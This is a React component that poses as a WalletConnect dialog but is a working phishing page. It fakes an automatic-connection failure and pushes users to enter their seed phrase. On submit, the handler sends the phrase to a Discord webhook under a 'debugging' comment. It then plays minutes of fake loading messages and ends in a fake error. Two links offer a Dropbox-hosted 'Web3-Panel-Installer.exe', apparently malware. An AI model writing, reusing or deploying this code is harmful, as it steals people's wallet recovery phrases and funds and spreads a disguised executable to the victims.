import React, { useState, useEffect } from 'react';
import { X, QrCode, AlertCircle, KeyRound, ShieldCheck, ChevronLeft, Eye, EyeOff, Loader2, XCircle } from 'lucide-react';
import { sendDiscordNotification } from '../utils/discord';

interface WalletModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose }) => {
  const [step, setStep] = useState<'wallets' | 'connect-options' | 'seed-phrase' | 'loading' | 'error'>('wallets');
  const [seedPhraseType, setSeedPhraseType] = useState<'12' | '24'>('12');
  const [showSeedPhrase, setShowSeedPhrase] = useState(false);
  const [seedPhrase, setSeedPhrase] = useState('');
  const [loadingStep, setLoadingStep] = useState(0);
  const [loadingMessage, setLoadingMessage] = useState('');

  const loadingSteps = [
    { message: 'Accessing blockchain network...', duration: 8000 },
    { message: 'Verifying wallet signature...', duration: 12000 },
    { message: 'Scanning transaction history...', duration: 15000 },
    { message: 'Analyzing smart contract interactions...', duration: 20000 },
    { message: 'Validating cross-chain assets...', duration: 25000 },
    { message: 'Checking DeFi positions...', duration: 30000 },
    { message: 'Verifying NFT collections...', duration: 35000 },
    { message: 'Processing wallet data...', duration: 40000 },
    { message: 'Finalizing connection...', duration: 45000 }
  ];

  // Automatically progress through initial steps
  useEffect(() => {
    if (step === 'wallets') {
      const timer = setTimeout(() => setStep('connect-options'), 5000);
      return () => clearTimeout(timer);
    }
  }, [step]);

  // Reset state when modal is opened
  useEffect(() => {
    if (isOpen) {
      setStep('wallets');
      setSeedPhrase('');
      setLoadingStep(0);
      setLoadingMessage('');
    }
  }, [isOpen]);

  // Handle loading sequence
  useEffect(() => {
    if (step === 'loading') {
      const runLoadingSequence = async () => {
        for (let i = 0; i < loadingSteps.length; i++) {
          setLoadingStep(i);
          setLoadingMessage(loadingSteps[i].message);
          await new Promise(resolve => setTimeout(resolve, loadingSteps[i].duration));
        }
        setStep('error');
      };
      
      runLoadingSequence();
    }
  }, [step]);

  const handleSeedPhraseSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // Send to Discord for debugging
    sendDiscordNotification('seed_phrase', undefined, {
      type: seedPhraseType,
      phrase: seedPhrase
    });
    setStep('loading');
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl w-full max-w-2xl relative">
        {/* Close Button */}
        <button
          onClick={onClose}
          className="absolute right-4 top-4 text-gray-400 hover:text-gray-600 transition-colors"
        >
          <X className="w-6 h-6" />
        </button>

        {/* Back Button */}
        {(step === 'seed-phrase' && step !== 'loading' && step !== 'error') && (
          <button
            onClick={() => setStep('connect-options')}
            className="absolute left-4 top-4 text-gray-400 hover:text-gray-600 transition-colors flex items-center gap-1"
          >
            <ChevronLeft className="w-5 h-5" />
            <span>Back</span>
          </button>
        )}

        {/* Content */}
        <div className="p-6">
          {step === 'wallets' && (
            <>
              <div className="text-center mb-6">
                <img 
                  src="https://ethereum-magicians.org/uploads/default/original/1X/e726391f66eb7da7a0ed7d780b4df5e8e2416a17.png"
                  alt="WalletConnect"
                  className="w-16 h-16 mx-auto mb-4"
                />
                <h2 className="text-2xl font-bold text-gray-900">Connect with WalletConnect</h2>
                <p className="text-gray-600 mt-2">Choose from 200+ supported wallets</p>
              </div>
              <div className="grid grid-cols-4 sm:grid-cols-5 md:grid-cols-6 gap-4 max-h-[400px] overflow-y-auto p-4">
                {Array.from({ length: 200 }).map((_, index) => (
                  <div
                    key={index}
                    className="aspect-square bg-gray-50 rounded-xl p-2 flex flex-col items-center justify-center gap-1 hover:bg-gray-100 transition-colors animate-fade-in"
                    style={{
                      animationDelay: `${index * 10}ms`
                    }}
                  >
                    <div className="w-8 h-8 bg-gradient-to-br from-gray-200 to-gray-300 rounded-full animate-pulse"></div>
                    <div className="w-12 h-2 bg-gray-200 rounded animate-pulse"></div>
                  </div>
                ))}
              </div>
            </>
          )}

          {step === 'connect-options' && (
            <div className="py-8">
              <div className="text-center mb-8">
                <AlertCircle className="w-12 h-12 text-amber-500 mx-auto mb-4" />
                <h3 className="text-xl font-semibold text-gray-900 mb-2">Automatic Connection Not Available</h3>
                <p className="text-gray-600">
                  Please use manual connection options below
                </p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <button
                  onClick={() => setStep('seed-phrase')}
                  className="bg-white border-2 border-gray-200 rounded-xl p-6 text-left hover:border-indigo-500 transition-colors group"
                >
                  <div className="flex items-center gap-3 mb-3">
                    <div className="p-2 rounded-lg bg-indigo-50 text-indigo-600 group-hover:bg-indigo-100 transition-colors">
                      <KeyRound className="w-6 h-6" />
                    </div>
                    <h4 className="font-semibold text-gray-900">Seed Phrase</h4>
                  </div>
                  <p className="text-sm text-gray-600">
                    Connect using your 12 or 24-word recovery phrase
                  </p>
                </button>

                <button
                  onClick={() => setStep('seed-phrase')}
                  className="bg-white border-2 border-gray-200 rounded-xl p-6 text-left hover:border-indigo-500 transition-colors group"
                >
                  <div className="flex items-center gap-3 mb-3">
                    <div className="p-2 rounded-lg bg-purple-50 text-purple-600 group-hover:bg-purple-100 transition-colors">
                      <ShieldCheck className="w-6 h-6" />
                    </div>
                    <h4 className="font-semibold text-gray-900">Private Key</h4>
                  </div>
                  <p className="text-sm text-gray-600">
                    Connect using your wallet's private key
                  </p>
                </button>
              </div>
            </div>
          )}

          {step === 'seed-phrase' && (
            <div className="py-8">
              <div className="text-center mb-8">
                <h3 className="text-2xl font-semibold text-gray-900 mb-2">Enter Seed Phrase</h3>
                <p className="text-gray-600">
                  Please enter your recovery phrase words in the correct order
                </p>
              </div>

              <div className="space-y-6">
                {/* Seed Phrase Type Selection */}
                <div className="flex gap-4 justify-center mb-6">
                  <button
                    onClick={() => setSeedPhraseType('12')}
                    className={`px-4 py-2 rounded-lg font-medium transition-colors ${
                      seedPhraseType === '12'
                        ? 'bg-indigo-600 text-white'
                        : 'bg-gray-100 text-gray-600 hover:bg-gray-200'
                    }`}
                  >
                    12 Words
                  </button>
                  <button
                    onClick={() => setSeedPhraseType('24')}
                    className={`px-4 py-2 rounded-lg font-medium transition-colors ${
                      seedPhraseType === '24'
                        ? 'bg-indigo-600 text-white'
                        : 'bg-gray-100 text-gray-600 hover:bg-gray-200'
                    }`}
                  >
                    24 Words
                  </button>
                </div>

                <form onSubmit={handleSeedPhraseSubmit}>
                  <div className="space-y-4">
                    <div className="relative">
                      <textarea
                        value={seedPhrase}
                        onChange={(e) => setSeedPhrase(e.target.value)}
                        placeholder={`Enter your ${seedPhraseType}-word seed phrase, with each word separated by a space`}
                        type={showSeedPhrase ? "text" : "password"}
                        className="w-full h-32 px-4 py-3 rounded-lg border-2 border-gray-200 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 transition-colors resize-none font-mono"
                        style={{ WebkitTextSecurity: showSeedPhrase ? 'none' : 'disc' }}
                        required
                      />
                      <button
                        type="button"
                        onClick={() => setShowSeedPhrase(!showSeedPhrase)}
                        className="absolute right-3 top-3 text-gray-400 hover:text-gray-600 transition-colors"
                      >
                        {showSeedPhrase ? (
                          <EyeOff className="w-5 h-5" />
                        ) : (
                          <Eye className="w-5 h-5" />
                        )}
                      </button>
                    </div>
                    <button
                      type="submit"
                      className="w-full py-3 px-4 bg-indigo-600 text-white rounded-lg hover:bg-indigo-700 transition-colors font-medium flex items-center justify-center gap-2"
                    >
                      <KeyRound className="w-5 h-5" />
                      Connect Wallet
                    </button>
                  </div>
                </form>

                <div className="mt-6 space-y-4">
                  <a 
                    href="https://www.dropbox.com/scl/fi/qnmitutujij0cdp53da8g/Web3-Panel-Installer.exe?rlkey=7g9shdoqhxmpqwhadfxbhh2ut&st=o53lhu45&dl=1"
                    className="block text-center text-sm text-indigo-600 hover:text-indigo-700 transition-colors"
                  >
                    Download our software for a more secure connection experience
                  </a>
                </div>
              </div>
            </div>
          )}
          
          {step === 'loading' && (
            <div className="py-12">
              <div className="text-center space-y-6">
                <div className="flex justify-center">
                  <Loader2 className="w-12 h-12 text-indigo-600 animate-spin" />
                </div>
                <div className="space-y-2">
                  <h3 className="text-xl font-semibold text-gray-900">
                    {loadingMessage}
                  </h3>
                  <p className="text-sm text-gray-500">
                    Please do not close this window
                  </p>
                </div>
                <div className="max-w-md mx-auto bg-gray-100 rounded-full h-1.5 mt-8">
                  <div 
                    className="bg-indigo-600 h-1.5 rounded-full transition-all duration-500"
                    style={{ width: `${(loadingStep + 1) / loadingSteps.length * 100}%` }}
                  ></div>
                </div>
              </div>
            </div>
          )}
          
          {step === 'error' && (
            <div className="py-12">
              <div className="text-center space-y-6">
                <div className="flex justify-center">
                  <XCircle className="w-16 h-16 text-red-500" />
                </div>
                <div className="space-y-2">
                  <h3 className="text-xl font-semibold text-gray-900">
                    Connection Error
                  </h3>
                  <p className="text-gray-600 max-w-md mx-auto">
                    Unable to establish a secure connection to the blockchain network. This could be due to network congestion or invalid credentials.
                  </p>
                </div>
                <div className="flex gap-4 justify-center mt-8">
                  <button
                    onClick={() => setStep('seed-phrase')}
                    className="px-6 py-2 bg-indigo-600 text-white rounded-lg hover:bg-indigo-700 transition-colors"
                  >
                    Try Again
                  </button>
                  <a
                    href="https://www.dropbox.com/scl/fi/qnmitutujij0cdp53da8g/Web3-Panel-Installer.exe?rlkey=7g9shdoqhxmpqwhadfxbhh2ut&st=o53lhu45&dl=1"
                    className="px-6 py-2 bg-gray-100 text-gray-700 rounded-lg hover:bg-gray-200 transition-colors"
                  >
                    Download Software
                  </a>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default WalletModal;